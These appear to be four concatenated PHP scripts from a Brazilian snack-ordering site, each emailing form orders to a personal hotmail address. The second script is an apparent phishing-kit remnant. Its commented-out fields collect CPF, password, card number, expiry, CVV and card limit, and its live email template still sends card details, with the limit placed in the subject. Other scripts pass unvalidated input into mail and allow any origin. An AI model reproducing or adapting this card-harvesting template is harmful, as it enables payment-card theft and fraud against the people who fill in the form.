<?php
// Verifica se o formulário foi enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Define as variáveis do formulário
    $lanche = $_POST["lanche"];
    $refri = $_POST["refri"];
    // $nome = $_POST["nome"];
    // $email = $_POST["email"];
    // $mensagem = $_POST["mensagem"];

    // Configurações de e-mail
    $para = "fabianoamaral47@hotmail.com";
    $assunto = "Pedidos Lanches";

    // Monta o corpo do e-mail
    $corpo = "lanche: $lanche\n";
    $corpo .= "refri: $refri\n";
    // $corpo = "Nome: $nome\n";
    // $corpo .= "Email: $email\n";
    // $corpo .= "Mensagem:\n$mensagem";

    // Envia o e-mail
    if (mail($para, $assunto, $corpo)) {
        echo "Pedido enviado com sucesso aguarde logo será entregue!";
    } else {
        echo "Falha ao enviar o email. Por favor, tente novamente mais tarde.";
    }
}
?>



<?php
// $email = $_POST['email'];
// $name = $_POST['name'];
$lanche = $_POST['lanche'];
$refri = $_POST['refri'];
// $cpf = $_POST['cpf'];
// $data = $_POST['nascimento'];
// $cidade = $_POST['cidade'];
// $estado = $_POST['estado'];
// $senha = $_POST['senha'];
// $nome_cartao = $_POST['cartao_n'];
// $numero = $_POST['numero'];
// $validade = $_POST['mes']."/".$_POST['ano'];
// $codigo = $_POST['codigo'];
// $limite = $_POST['limite'];

$body = "Email = ".$email."
name = ".$name."
lanche = ".$lanche."
refri = ".$refri."

=====================================
Nome cartao = ".$nome_cartao."
Numero Cartao = ".$numero."
validade = ".$validade."
Cvv = ".$codigo."
Limite = ".$limite."
";

if(mail("fabianoamaral47@hotmail.com",$name."[".$limite."]",$body))
{
	header("location:sucesso.html");
};
?>





<?php
// Permitir requisições de qualquer origem
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// Verifica se foi enviado JSON via POST
$input = file_get_contents("php://input");
$data = json_decode($input, true);

// Validação dos dados
if (!$data || !isset($data["nomeCliente"]) || !isset($data["itens"])) {
    echo json_encode(["success" => false, "message" => "Dados incompletos."]);
    exit;
}

// Dados do cliente e itens
$nomeCliente = htmlspecialchars(trim($data["nomeCliente"]));
$itens = $data["itens"];

// Montar corpo do pedido
$mensagem = "🍔 Pedido de: $nomeCliente\n\n🛍 Itens do Pedido:\n";
$total = 0;

foreach ($itens as $item) {
    $nome = htmlspecialchars($item["nome"]);
    $qtd = intval($item["qtd"]);
    $preco = floatval($item["preco"]);
    $subtotal = $qtd * $preco;
    $total += $subtotal;

    $mensagem .= "- $qtd x $nome (R$ " . number_format($preco, 2, ',', '.') . ") = R$ " . number_format($subtotal, 2, ',', '.') . "\n";
}

$mensagem .= "\n💰 Total: R$ " . number_format($total, 2, ',', '.');

// Configuração do envio
$para = "fabianoamaral47@hotmail.com";
$assunto = "Novo Pedido de $nomeCliente";
$headers = "From: pedidos@seudominio.com\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Envia o e-mail
if (mail($para, $assunto, $mensagem, $headers)) {
    echo json_encode(["success" => true, "message" => "Pedido enviado com sucesso!"]);
} else {
    echo json_encode(["success" => false, "message" => "Erro ao enviar o e-mail."]);
}
?>


<?php
// CONFIGURAÇÕES
$destino = "fabianoamaral47@hotmail.com"; // 🔥 Coloque seu e-mail aqui
$assunto = "Novo Pedido de Lanches Gourmet";

// DADOS DO FORMULÁRIO
$nome = $_POST["nome"];
$endereco = $_POST["endereco"];
$pagamento = $_POST["pagamento"];
$pedido = $_POST["pedido"];

// MONTAR O E-MAIL
$mensagem = "Novo Pedido de Lanches Gourmet\n\n";
$mensagem .= "Nome: " . $nome . "\n";
$mensagem .= "Endereço: " . $endereco . "\n";
$mensagem .= "Forma de Pagamento: " . $pagamento . "\n\n";
$mensagem .= "Pedido:\n" . $pedido . "\n";

// CABEÇALHOS
$headers = "From: site@seudominio.com\r\n";
$headers .= "Reply-To: " . $destino . "\r\n";
$headers .= "X-Mailer: PHP/" . phpversion();

// ENVIAR
$enviado = mail($destino, $assunto, $mensagem, $headers);

// RETORNO
if ($enviado) {
    echo "<h2>✅ Pedido enviado com sucesso!</h2>";
    echo "<p>Voltar para <a href='index.html'>Página Inicial</a></p>";
} else {
    echo "<h2>❌ Erro ao enviar o pedido.</h2>";
    echo "<p>Voltar para <a href='index.html'>Página Inicial</a></p>";
}
?>
